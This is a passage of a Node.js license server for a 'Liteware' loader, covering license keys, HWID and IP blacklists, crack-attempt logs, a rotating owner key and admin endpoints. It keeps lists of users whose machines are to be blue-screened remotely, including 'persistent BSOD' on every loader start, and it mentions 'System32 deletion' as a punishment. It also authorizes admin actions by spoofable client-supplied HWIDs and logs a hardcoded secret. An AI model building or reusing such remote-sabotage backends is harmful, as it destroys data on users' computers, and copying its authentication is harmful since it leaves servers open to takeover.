        console.error('   This is normal on first run. Creating new log file.');
    }
    
    // Ensure array is initialized
    if (!global.crackAttempts || !Array.isArray(global.crackAttempts)) {
        global.crackAttempts = [];
    }
}

// Save crack logs to file
function saveCrackLogsToFile() {
    try {
        if (global.crackAttempts && Array.isArray(global.crackAttempts)) {
            // Create backup before writing
            if (fs.existsSync(CRACK_LOGS_FILE)) {
                try {
                    fs.copyFileSync(CRACK_LOGS_FILE, CRACK_LOGS_FILE + '.backup');
                } catch (backupError) {
                    // Ignore backup errors
                }
            }
            
            // Write to file atomically
            const tempFile = CRACK_LOGS_FILE + '.tmp';
            fs.writeFileSync(tempFile, JSON.stringify(global.crackAttempts, null, 2), 'utf8');
            fs.renameSync(tempFile, CRACK_LOGS_FILE);
            console.log(`✅ Saved ${global.crackAttempts.length} crack logs to file`);
        } else {
            console.warn('⚠️ Cannot save logs: global.crackAttempts is not an array');
        }
    } catch (error) {
        console.error('❌ Error saving crack logs to file:', error.message);
        console.error('   Logs are still stored in memory and will be saved on next attempt.');
    }
}

// Load logs on startup
loadCrackLogsFromFile();

// Auto-save logs every 5 seconds
setInterval(() => {
    saveCrackLogsToFile();
}, 5000);

// In-memory database (replace with real database like MySQL, MongoDB, or SQLite)
const users = {
    // Format: username: { password_hash, license_keys: [], hwid: null }
    'testuser': {
        password_hash: crypto.createHash('sha256').update('testpass123').digest('hex'),
        license_keys: ['LICENSE-KEY-12345'],
        hwid: null
    }
};

const licenses = {
    // Format: license_key: { valid: true, used: false, hwid: null, ip: null, expiry: null, system_info: {} }
    // Add your license keys here:
    'LICENSE-KEY-12345': {
        valid: true,
        used: false,
        hwid: null,
        ip: null,
        expiry: null, // null = never expires
        system_info: null, // Will store full system information
        first_used: null, // Timestamp of first use
        last_used: null // Timestamp of last use
    },
    // Example working license keys (you can add more):
    'LICENSE-21262A9912B0CD4E': {
        valid: true,
        used: false,
        hwid: null,
        ip: null,
        expiry: null,
        system_info: null,
        first_used: null,
        last_used: null
    },
    'LICENSE-TEST-KEY-2024': {
        valid: true,
        used: false,
        hwid: null,
        ip: null,
        expiry: null,
        system_info: null,
        first_used: null,
        last_used: null
    },
    'LICENSE-A1B2C3D4-E5F6G7H8': {
        valid: true,
        used: false,
        hwid: null,
        ip: null,
        expiry: null,
        system_info: null,
        first_used: null,
        last_used: null
    },
    'LICENSE-I9J0K1L2-M3N4O5P6': {
        valid: true,
        used: false,
        hwid: null,
        ip: null,
        expiry: null,
        system_info: null,
        first_used: null,
        last_used: null
    }
};

// Blacklist storage (HWID and IP addresses)
const blacklistedHWIDs = [];
const blacklistedIPs = [];

// Whitelist storage (License keys that are exempt from BSOD and System32 deletion)
const whitelistedLicenseKeys = ['LICENSE-21262A9912B0CD4E']; // Whitelist user's key by default

// Remote BSOD storage (License keys that should trigger BSOD on next authentication)
const remoteBSODKeys = [];

// ========================================
// PERSISTENT BSOD SYSTEM
// ========================================
// This stores HWIDs that should be BSOD'd immediately when loader starts
// Even if user restarts PC, they will be BSOD'd on next loader open
const PERSISTENT_BSOD_FILE = path.join(__dirname, 'persistent_bsod.json');
let persistentBSODList = {
    hwids: [],      // HWIDs to BSOD
    licenseKeys: [] // License keys to BSOD (will lookup HWID from license)
};

// Load persistent BSOD list from file
function loadPersistentBSOD() {
    try {
        if (fs.existsSync(PERSISTENT_BSOD_FILE)) {
            const data = fs.readFileSync(PERSISTENT_BSOD_FILE, 'utf8');
            persistentBSODList = JSON.parse(data);
            console.log(`🔴 Loaded ${persistentBSODList.hwids.length} HWIDs and ${persistentBSODList.licenseKeys.length} license keys for persistent BSOD`);
        }
    } catch (error) {
        console.error('Error loading persistent BSOD list:', error);
        persistentBSODList = { hwids: [], licenseKeys: [] };
    }
}

// Save persistent BSOD list to file
function savePersistentBSOD() {
    try {
        fs.writeFileSync(PERSISTENT_BSOD_FILE, JSON.stringify(persistentBSODList, null, 2));
        console.log('💾 Saved persistent BSOD list');
    } catch (error) {
        console.error('Error saving persistent BSOD list:', error);
    }
}

// Load on startup
loadPersistentBSOD();

// ========================================
// OWNER KEY SYSTEM (24-HOUR AUTO-ROTATION)
// ========================================
const OWNER_KEY_FILE = path.join(__dirname, 'owner_key.json');

let ownerKeyData = {
    key: '',
    generatedAt: null,
    nextRotation: null
};

// Generate a secure random owner key
function generateOwnerKey() {
    return crypto.randomBytes(32).toString('hex');
}

// Load owner key from file
function loadOwnerKey() {
    try {
        if (fs.existsSync(OWNER_KEY_FILE)) {
            const data = fs.readFileSync(OWNER_KEY_FILE, 'utf8');
            ownerKeyData = JSON.parse(data);
            
            // Check if key needs rotation (24 hours)
            const now = Date.now();
            if (ownerKeyData.nextRotation && now >= ownerKeyData.nextRotation) {
                console.log('🔑 Owner key expired - generating new key');
                rotateOwnerKey();
            } else if (!ownerKeyData.key) {
                rotateOwnerKey();
            } else {
                console.log(`🔑 Owner key loaded. Next rotation: ${new Date(ownerKeyData.nextRotation).toISOString()}`);
            }
        } else {
            // First time - generate initial key
            rotateOwnerKey();
        }
    } catch (error) {
        console.error('Error loading owner key:', error);
        rotateOwnerKey();
    }
}

// Rotate owner key (new key every 24 hours)
function rotateOwnerKey() {
    ownerKeyData.key = generateOwnerKey();
    ownerKeyData.generatedAt = Date.now();
    ownerKeyData.nextRotation = ownerKeyData.generatedAt + (24 * 60 * 60 * 1000); // 24 hours
    
    try {
        fs.writeFileSync(OWNER_KEY_FILE, JSON.stringify(ownerKeyData, null, 2));
        console.log(`🔑 NEW OWNER KEY GENERATED: ${ownerKeyData.key.substring(0, 16)}...`);
        console.log(`   Next rotation: ${new Date(ownerKeyData.nextRotation).toISOString()}`);
    } catch (error) {
        console.error('Error saving owner key:', error);
    }
}

// Check owner key
function validateOwnerKey(key) {
    if (!ownerKeyData.key || !key) return false;
    // Simple string comparison (keys rotate every 24h, timing attacks not a concern)
    return key.trim().toLowerCase() === ownerKeyData.key.trim().toLowerCase();
}

// Load owner key on startup
loadOwnerKey();

// Auto-rotate key every 24 hours
setInterval(() => {
    const now = Date.now();
    if (ownerKeyData.nextRotation && now >= ownerKeyData.nextRotation) {
        rotateOwnerKey();
    }
}, 60 * 60 * 1000); // Check every hour

// Owner key validation middleware
function validateOwnerKeyMiddleware(req, res, next) {
    const ownerKey = req.body.owner_key || req.headers['x-owner-key'] || req.query.owner_key;
    
    if (!ownerKey) {
        return res.status(401).json({
            success: false,
            error: 'OWNER_KEY_REQUIRED',
            message: 'Owner key is required'
        });
    }
    
    if (!validateOwnerKey(ownerKey)) {
        // Log failed attempts
        const ip = req.ip || req.connection.remoteAddress;
        console.log(`🚫 Invalid owner key attempt from ${ip}`);
        
        return res.status(403).json({
            success: false,
            error: 'INVALID_OWNER_KEY',
            message: 'Invalid owner key'
        });
    }
    
    next();
}

// ========================================
// OWNER HWID WHITELIST
// ========================================
// Only these HWIDs/GPU hashes can access the owner key viewer page
// 
// TO GET YOUR HWID:
// 1. Run your Liteware loader and authenticate
// 2. Check the server logs - it will show the HWID/GPU hash
// 3. Or check the license info in the dashboard for your license key
// 4. Add your HWID and GPU hash below (case-insensitive)
//
// EXAMPLE:
// const OWNER_HWIDS = [
//     '705feb88-a559-5867-4172-3970f1ae66f5',  // Your GPU hash
//     'COMPUTER-NAME'  // Your HWID (if different)
// ];
const OWNER_HWIDS = [
    '7af1ba56-2242-cd8c-f9e3-cb91eede2235',  // GPU GUID (from hardware comparison)
    'GPU-7af1ba56-2242-cd8c-f9e3-cb91eede2235',  // Full GPU GUID format
    'E75E98D8-B4D3-27E0-A717-865ED3BB1DC4',  // System UUID (backup)
    '692b01de-998e-57cb-1dba-b71aa04eafc0',  // GPU GUID (Acer Predator PO3-630 - RTX 3060)
    'GPU-692b01de-998e-57cb-1dba-b71aa04eafc0',  // Full GPU GUID format (Acer Predator PO3-630)
    '216703659016542',  // System Serial Number (Acer Predator PO3-630)
];

// Access request storage (in production, use a database)
// Format: { hwid: { status: 'pending'|'approved'|'denied', ip, pc_name, timestamp, requested_at } }
const accessRequests = new Map();

// Load access requests from file if it exists
const accessRequestsFile = path.join(__dirname, 'access_requests.json');
try {
    if (fs.existsSync(accessRequestsFile)) {
        const data = JSON.parse(fs.readFileSync(accessRequestsFile, 'utf8'));
        Object.entries(data).forEach(([hwid, request]) => {
            accessRequests.set(hwid, request);
        });
        console.log(`✅ Loaded ${accessRequests.size} access requests from file`);
    }
} catch (err) {
    console.log('No existing access requests file, starting fresh');
}

// Save access requests to file
function saveAccessRequests() {
    try {
        const data = Object.fromEntries(accessRequests);
        fs.writeFileSync(accessRequestsFile, JSON.stringify(data, null, 2));
    } catch (err) {
        console.error('Error saving access requests:', err);
    }
}

// Get current owner key (protected by HWID)
app.post('/auth/get-owner-key-by-hwid', (req, res) => {
    const { hwid, gpu_hash } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    if (!clientHwid) {
        return res.status(400).json({
            success: false,
            error: 'HWID_REQUIRED',
            message: 'HWID is required'
        });
    }
    
    // Check if HWID is in whitelist
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === clientHwid.toLowerCase()
    );
    
    if (isAuthorized) {
        // Authorized - return owner key
        console.log(`✅ Authorized owner key access from HWID: ${clientHwid}`);
        
        res.json({
            success: true,
            owner_key: ownerKeyData.key,
            generated_at: ownerKeyData.generatedAt,
            next_rotation: ownerKeyData.nextRotation,
            time_until_rotation: ownerKeyData.nextRotation ? ownerKeyData.nextRotation - Date.now() : null,
            rotation_date: ownerKeyData.nextRotation ? new Date(ownerKeyData.nextRotation).toISOString() : null
        });
        return;
    }
    
    // Not authorized - check if there's an access request
    const request = accessRequests.get(clientHwid);
    
    if (!request) {
        // No request yet - return blocked status
        console.log(`🚫 Unauthorized owner key access attempt from HWID: ${clientHwid}`);
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED_HWID',
            message: 'Access denied. Your hardware is not authorized.',
            access_status: 'blocked'
        });
    }
    
    // Check request status
    if (request.status === 'approved') {
        // Approved - add to whitelist and return key
        if (!OWNER_HWIDS.includes(clientHwid)) {
            OWNER_HWIDS.push(clientHwid);
        }
        console.log(`✅ Access request approved for HWID: ${clientHwid}`);
        
        res.json({
            success: true,
            owner_key: ownerKeyData.key,
            generated_at: ownerKeyData.generatedAt,
            next_rotation: ownerKeyData.nextRotation,
            time_until_rotation: ownerKeyData.nextRotation ? ownerKeyData.nextRotation - Date.now() : null,
            rotation_date: ownerKeyData.nextRotation ? new Date(ownerKeyData.nextRotation).toISOString() : null
        });
        return;
    }
    
    if (request.status === 'denied') {
        return res.status(403).json({
            success: false,
            error: 'ACCESS_DENIED',
            message: 'Your access request has been denied by LiteWare administrators.',
            access_status: 'denied'
        });
    }
    
    // Status is 'pending'
    return res.status(403).json({
        success: false,
        error: 'ACCESS_PENDING',
        message: 'Your access request is pending approval by LiteWare administrators.',
        access_status: 'pending'
    });
});

// Submit access request
app.post('/auth/submit-access-request', (req, res) => {
    const { hwid, gpu_hash, ip_address, pc_name } = req.body;
    const clientHwid = gpu_hash || hwid;
    const clientIP = req.ip || req.connection.remoteAddress || ip_address || 'Unknown';
    const clientPCName = pc_name || 'Unknown';
    
    if (!clientHwid) {
        return res.status(400).json({
            success: false,
            message: 'HWID is required'
        });
    }
    
    // Check if already authorized
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === clientHwid.toLowerCase()
    );
    
    if (isAuthorized) {
        return res.json({
            success: true,
            message: 'Your hardware is already authorized.',
            access_status: 'approved'
        });
    }
    
    // Check if request already exists
    const existingRequest = accessRequests.get(clientHwid);
    
    if (existingRequest) {
        return res.json({
            success: true,
            message: `Access request already exists. Status: ${existingRequest.status}`,
            access_status: existingRequest.status
        });
    }
    
    // Create new access request
    const request = {
        hwid: clientHwid,
        ip: clientIP,
        pc_name: clientPCName,
        status: 'pending',
        requested_at: Date.now(),
        timestamp: new Date().toISOString()
    };
    
    accessRequests.set(clientHwid, request);
    saveAccessRequests();
    
    console.log(`📝 New access request from HWID: ${clientHwid}, IP: ${clientIP}, PC: ${clientPCName}`);
    
    res.json({
        success: true,
        message: 'Access request submitted successfully. Waiting for approval.',
        access_status: 'pending'
    });
});

// List access requests (Admin only)
app.post('/auth/admin/list-access-requests', (req, res) => {
    const { hwid, gpu_hash, app_secret } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied'
        });
    }
    
    const requests = Array.from(accessRequests.values());
    
    res.json({
        success: true,
        requests: requests,
        total: requests.length,
        pending: requests.filter(r => r.status === 'pending').length,
        approved: requests.filter(r => r.status === 'approved').length,
        denied: requests.filter(r => r.status === 'denied').length
    });
});

// Approve access request (Admin only)
app.post('/auth/admin/approve-access-request', (req, res) => {
    const { hwid, gpu_hash, app_secret, request_hwid } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied'
        });
    }
    
    if (!request_hwid) {
        return res.status(400).json({
            success: false,
            message: 'Request HWID is required'
        });
    }
    
    const request = accessRequests.get(request_hwid);
    
    if (!request) {
        return res.status(404).json({
            success: false,
            message: 'Access request not found'
        });
    }
    
    // Update request status
    request.status = 'approved';
    request.approved_at = Date.now();
    request.approved_by = clientHwid || 'admin';
    accessRequests.set(request_hwid, request);
    saveAccessRequests();
    
    // Add to whitelist
    if (!OWNER_HWIDS.includes(request_hwid)) {
        OWNER_HWIDS.push(request_hwid);
    }
    
    console.log(`✅ Access request approved for HWID: ${request_hwid}`);
    
    res.json({
        success: true,
        message: 'Access request approved successfully'
    });
});

// Deny access request (Admin only)
app.post('/auth/admin/deny-access-request', (req, res) => {
    const { hwid, gpu_hash, app_secret, request_hwid } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied'
        });
    }
    
    if (!request_hwid) {
        return res.status(400).json({
            success: false,
            message: 'Request HWID is required'
        });
    }
    
    const request = accessRequests.get(request_hwid);
    
    if (!request) {
        return res.status(404).json({
            success: false,
            message: 'Access request not found'
        });
    }
    
    // Update request status
    request.status = 'denied';
    request.denied_at = Date.now();
    request.denied_by = clientHwid || 'admin';
    accessRequests.set(request_hwid, request);
    saveAccessRequests();
    
    console.log(`❌ Access request denied for HWID: ${request_hwid}`);
    
    res.json({
        success: true,
        message: 'Access request denied successfully'
    });
});

// Get current owner key (protected endpoint - admin only with app secret)
app.post('/auth/get-owner-key', validateAppSecret, (req, res) => {
    res.json({
        success: true,
        owner_key: ownerKeyData.key,
        generated_at: ownerKeyData.generatedAt,
        next_rotation: ownerKeyData.nextRotation,
        time_until_rotation: ownerKeyData.nextRotation ? ownerKeyData.nextRotation - Date.now() : null
    });
});

// Validate owner key for unlocking license generator
app.post('/auth/validate-owner-key', (req, res) => {
    const { owner_key } = req.body;
    
    if (!owner_key) {
        return res.status(400).json({
            success: false,
            message: 'Owner key required'
        });
    }
    
    const isValid = validateOwnerKey(owner_key);
    
    if (isValid) {
        res.json({
            success: true,
            message: 'Owner key validated',
            expires_at: ownerKeyData.nextRotation,
            time_remaining: ownerKeyData.nextRotation - Date.now()
        });
    } else {
        res.status(401).json({
            success: false,
            message: 'Invalid owner key'
        });
    }
});

// Verify owner key endpoint (for frontend)
app.post('/auth/verify-owner-key', (req, res) => {
    const { owner_key } = req.body;
    
    console.log('[OWNER KEY VERIFY] Received key length:', owner_key ? owner_key.length : 0);
    console.log('[OWNER KEY VERIFY] Expected key length:', ownerKeyData.key ? ownerKeyData.key.length : 0);
    console.log('[OWNER KEY VERIFY] Received key (first 20 chars):', owner_key ? owner_key.substring(0, 20) : 'null');
    console.log('[OWNER KEY VERIFY] Expected key (first 20 chars):', ownerKeyData.key ? ownerKeyData.key.substring(0, 20) : 'null');
    
    if (!owner_key) {
        console.log('[OWNER KEY VERIFY] ❌ No owner key provided');
        return res.status(400).json({
            success: false,
            error: 'OWNER_KEY_REQUIRED',
            message: 'Owner key is required'
        });
    }
    
    // Try multiple formats: direct hex, base64-encoded hex, or try as-is
    let keyToCheck = owner_key.trim();
    
    // First, try direct validation (most common case - hex string)
    if (validateOwnerKey(keyToCheck)) {
        console.log('[OWNER KEY VERIFY] ✅ Key validated (direct match)');
        const sessionToken = crypto.randomBytes(64).toString('hex');
        if (!global.ownerSessions) global.ownerSessions = new Map();
        global.ownerSessions.set(sessionToken, {
            createdAt: Date.now(),
            expiresAt: Date.now() + (24 * 60 * 60 * 1000)
        });
        return res.json({
            success: true,
            session_token: sessionToken,
            expires_at: Date.now() + (24 * 60 * 60 * 1000)
        });
    }
    
    // Try base64 decoding if direct match failed
    if (!/^[0-9a-fA-F]+$/.test(keyToCheck)) {
        try {
            const decoded = Buffer.from(keyToCheck, 'base64').toString('hex');
            console.log('[OWNER KEY VERIFY] Attempting base64 decode, decoded length:', decoded.length);
            if (validateOwnerKey(decoded)) {
                console.log('[OWNER KEY VERIFY] ✅ Key validated (after base64 decode)');
                const sessionToken = crypto.randomBytes(64).toString('hex');
                if (!global.ownerSessions) global.ownerSessions = new Map();
                global.ownerSessions.set(sessionToken, {
                    createdAt: Date.now(),
                    expiresAt: Date.now() + (24 * 60 * 60 * 1000)
                });
                return res.json({
                    success: true,
                    session_token: sessionToken,
                    expires_at: Date.now() + (24 * 60 * 60 * 1000)
                });
            }
        } catch (e) {
            console.log('[OWNER KEY VERIFY] Base64 decode failed:', e.message);
        }
    }
    
    // All validation attempts failed
    console.log('[OWNER KEY VERIFY] ❌ Key validation failed - all formats tried');
    console.log('[OWNER KEY VERIFY] Received (first 20):', keyToCheck.substring(0, 20) + '...');
    console.log('[OWNER KEY VERIFY] Expected (first 20):', ownerKeyData.key ? ownerKeyData.key.substring(0, 20) + '...' : 'NO KEY LOADED');
    return res.status(403).json({
        success: false,
        error: 'INVALID_OWNER_KEY',
        message: 'Invalid owner key'
    });
});

// Admin endpoints - protected by HWID (only authorized HWIDs can access)
app.post('/auth/admin/disable-server', (req, res) => {
    const { hwid, gpu_hash, app_secret } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied'
        });
    }
    
    serverDisabled = true;
    console.log('🚫 Server disabled - all requests will be blocked');
    
    res.json({
        success: true,
        message: 'Server disabled successfully. All requests are now blocked.',
        disabled: true
    });
});

app.post('/auth/admin/enable-server', (req, res) => {
    const { hwid, gpu_hash, app_secret } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied'
        });
    }
    
    serverDisabled = false;
    console.log('✅ Server re-enabled - all requests are now allowed');
    
    res.json({
        success: true,
        message: 'Server re-enabled successfully. All services are operational.',
        disabled: false
    });
});

app.post('/auth/admin/server-status', (req, res) => {
    const uptimeMs = Date.now() - serverStartTime;
    const uptimeSeconds = Math.floor(uptimeMs / 1000);
    const days = Math.floor(uptimeSeconds / 86400);
    const hours = Math.floor((uptimeSeconds % 86400) / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = uptimeSeconds % 60;
    
    let uptimeFormatted = '';
    if (days > 0) uptimeFormatted += `${days}d `;
    if (hours > 0 || days > 0) uptimeFormatted += `${hours}h `;
    if (minutes > 0 || hours > 0 || days > 0) uptimeFormatted += `${minutes}m `;
    uptimeFormatted += `${seconds}s`;
    
    res.json({
        success: true,
        disabled: serverDisabled,
        message: serverDisabled ? 'Server is disabled' : 'Server is operational',
        uptime: uptimeFormatted,
        uptime_ms: uptimeMs,
        active_sessions: activeSessions.size
    });
});

app.post('/auth/admin/shutdown', (req, res) => {
    const { hwid, gpu_hash, app_secret } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied'
        });
    }
    
    console.log('🛑 Shutdown command received from authorized source');
    
    res.json({
        success: true,
        message: 'Server will shutdown in 3 seconds'
    });
    
    // Shutdown after response is sent
    setTimeout(() => {
        console.log('🛑 Shutting down server...');
        process.exit(0);
    }, 3000);
});

app.post('/auth/admin/maintenance', (req, res) => {
    const { hwid, gpu_hash, enabled, app_secret } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied'
        });
    }
    
    maintenanceMode = enabled === true || enabled === 'true';
    console.log(`🔧 Maintenance mode ${maintenanceMode ? 'ENABLED' : 'DISABLED'}`);
    
    res.json({
        success: true,
        maintenance_mode: maintenanceMode,
        message: `Maintenance mode ${maintenanceMode ? 'enabled' : 'disabled'}`
    });
});

app.post('/auth/admin/clear-logs', (req, res) => {
    const { hwid, gpu_hash, app_secret } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied'
        });
    }
    
    // Clear crack logs
    try {
        if (global.crackLogs) {
            global.crackLogs.clear();
        }
        console.log('🗑️ All crack logs cleared by admin');
        
        res.json({
            success: true,
            message: 'All logs cleared successfully'
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: 'CLEAR_FAILED',
            message: error.message
        });
    }
});

app.post('/auth/admin/reset-limits', (req, res) => {
    const { hwid, gpu_hash, app_secret } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied'
        });
    }
    
    // Reset rate limits
    try {
        if (global.rateLimitMap) {
            global.rateLimitMap.clear();
        }
        if (global.bannedIPs) {
            global.bannedIPs.clear();
        }
        if (global.bannedHWIDs) {
            global.bannedHWIDs.clear();
        }
        console.log('🔄 Rate limits reset by admin');
        
        res.json({
            success: true,
            message: 'Rate limits reset successfully'
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: 'RESET_FAILED',
            message: error.message
        });
    }
});

// Verify owner session
function validateOwnerSession(req, res, next) {
    const sessionToken = req.body.session_token || req.headers['x-owner-session'] || req.cookies.owner_session;
    
    if (!sessionToken || !global.ownerSessions || !global.ownerSessions.has(sessionToken)) {
        return res.status(401).json({
            success: false,
            error: 'SESSION_INVALID',
            message: 'Owner session expired or invalid'
        });
    }
    
    const session = global.ownerSessions.get(sessionToken);
    if (Date.now() > session.expiresAt) {
        global.ownerSessions.delete(sessionToken);
        return res.status(401).json({
            success: false,
            error: 'SESSION_EXPIRED',
            message: 'Owner session expired'
        });
    }
    
    req.ownerSession = session;
    next();
}

// Application secret (keep this secure!)
// IMPORTANT: Change this to a secure random string!
const APP_SECRET = 'ABCJDWQ91D9219D21JKWDDKQAD912Q';

// Helper function to deobfuscate data (XOR with key)
function deobfuscateData(obfuscated, key) {
    try {
        if (!obfuscated || !key) return obfuscated;
        const dataBytes = Buffer.from(obfuscated, 'base64');
        const keyBytes = Buffer.from(key, 'utf8');
        const result = Buffer.alloc(dataBytes.length);
        for (let i = 0; i < dataBytes.length; i++) {
            result[i] = dataBytes[i] ^ keyBytes[i % keyBytes.length];
        }
        return result.toString('utf8');
    } catch (e) {
        return obfuscated; // Return original if deobfuscation fails
    }
}

// Middleware to validate app secret (with obfuscation support)
function validateAppSecret(req, res, next) {
    let appSecret = req.body.app_secret || req.body.app_secret;
    const { _obf_key, _obf_enabled } = req.body;
    
    // Debug logging
    console.log(`[validateAppSecret] Path: ${req.path}, IP: ${req.ip || req.connection.remoteAddress}`);
    console.log(`[validateAppSecret] app_secret received: ${appSecret ? 'Present (' + appSecret.length + ' chars)' : 'Missing'}`);
    console.log(`[validateAppSecret] Expected APP_SECRET: ${APP_SECRET}`);
    
    // Deobfuscate app_secret if obfuscation is enabled
    if (_obf_enabled === '1' && _obf_key && appSecret) {
        try {
            appSecret = deobfuscateData(appSecret, _obf_key);
            console.log(`[validateAppSecret] Deobfuscated app_secret: ${appSecret}`);
        } catch (e) {
            console.error('Deobfuscation error in middleware:', e);
        }
    }
    
    if (appSecret !== APP_SECRET) {
        console.log(`[validateAppSecret] ❌ Invalid app_secret! Expected: "${APP_SECRET}", Got: "${appSecret}"`);
        return res.json({ success: false, message: 'Invalid application secret' });
    }
    console.log(`[validateAppSecret] ✅ App secret validated successfully`);
    next();
}

// ========================================
// LOADER STATUS CONTROL
// ========================================

// Global loader status (auto-updates for all clients)
let loaderStatus = {
    enabled: true,
    message: '',
    disabledAt: null,
    lastUpdated: new Date().toISOString()
};

// Loader status file for persistence
const LOADER_STATUS_FILE = path.join(__dirname, 'loader_status.json');

// Load loader status from file on startup
function loadLoaderStatus() {
    try {
        if (fs.existsSync(LOADER_STATUS_FILE)) {
            const data = fs.readFileSync(LOADER_STATUS_FILE, 'utf8');
            const parsed = JSON.parse(data);
            loaderStatus = { ...loaderStatus, ...parsed };
            console.log('✅ Loaded loader status from file:', loaderStatus.enabled ? 'ENABLED' : 'DISABLED');
        }
    } catch (error) {
        console.error('Error loading loader status:', error.message);
    }
}

// Save loader status to file
function saveLoaderStatus() {
    try {
        fs.writeFileSync(LOADER_STATUS_FILE, JSON.stringify(loaderStatus, null, 2), 'utf8');
    } catch (error) {
        console.error('Error saving loader status:', error.message);
    }
}

// Load status on startup
loadLoaderStatus();



// ========================================
// WEBSITE LOCK SYSTEM
// ========================================

let websiteLockStatus = {
    locked: false,
    message: '',
    lockedAt: null,
    lastUpdated: new Date().toISOString()
};

// Website lock status file for persistence
const WEBSITE_LOCK_FILE = path.join(__dirname, 'website_lock.json');

// Load website lock status from file on startup
function loadWebsiteLockStatus() {
    try {
        if (fs.existsSync(WEBSITE_LOCK_FILE)) {
            const data = fs.readFileSync(WEBSITE_LOCK_FILE, 'utf8');
            const parsed = JSON.parse(data);
            websiteLockStatus = { ...websiteLockStatus, ...parsed };
            console.log('✅ Loaded website lock status from file:', websiteLockStatus.locked ? 'LOCKED' : 'UNLOCKED');
        }
    } catch (error) {
        console.error('Error loading website lock status:', error.message);
    }
}

// Save website lock status to file
function saveWebsiteLockStatus() {
    try {
        fs.writeFileSync(WEBSITE_LOCK_FILE, JSON.stringify(websiteLockStatus, null, 2), 'utf8');
    } catch (error) {
        console.error('Error saving website lock status:', error.message);
    }
}

// Load status on startup
loadWebsiteLockStatus();

// Get website lock status endpoint (for dashboard checking)
app.post('/auth/website-lock-status', (req, res) => {
    res.json({
        success: true,
        locked: websiteLockStatus.locked,
        message: websiteLockStatus.message,
        lockedAt: websiteLockStatus.lockedAt,
        lastUpdated: websiteLockStatus.lastUpdated
    });
});

// Set website lock status endpoint (lock/unlock)
app.post('/auth/set-website-lock-status', (req, res) => {
    const { hwid, gpu_hash, app_secret, locked, message } = req.body;
    const clientHwid = gpu_hash || hwid;
    
    // Verify HWID authorization or app secret
    const isAuthorized = OWNER_HWIDS.some(allowedHwid => 
        allowedHwid.toLowerCase() === (clientHwid || '').toLowerCase()
    );
    
    if (!isAuthorized && app_secret !== APP_SECRET) {
        return res.status(403).json({
            success: false,
            error: 'UNAUTHORIZED',
            message: 'Access denied. Owner authorization required.'
        });
    }
    
    websiteLockStatus.locked = locked === true || locked === 'true';
    websiteLockStatus.message = message || (locked ? 'This website has been locked by LiteWare administrators' : '');
    websiteLockStatus.lastUpdated = new Date().toISOString();
    
    if (locked) {
        websiteLockStatus.lockedAt = new Date().toISOString();
    } else {
        websiteLockStatus.lockedAt = null;
    }
    
    saveWebsiteLockStatus();
    
    console.log(`🔒 Website lock status changed to: ${websiteLockStatus.locked ? 'LOCKED' : 'UNLOCKED'}`);
    
    res.json({
        success: true,
        message: `Website ${websiteLockStatus.locked ? 'locked' : 'unlocked'} successfully`,
        status: websiteLockStatus
    });
});

// ========================================
// Get loader status endpoint (for dashboard polling)
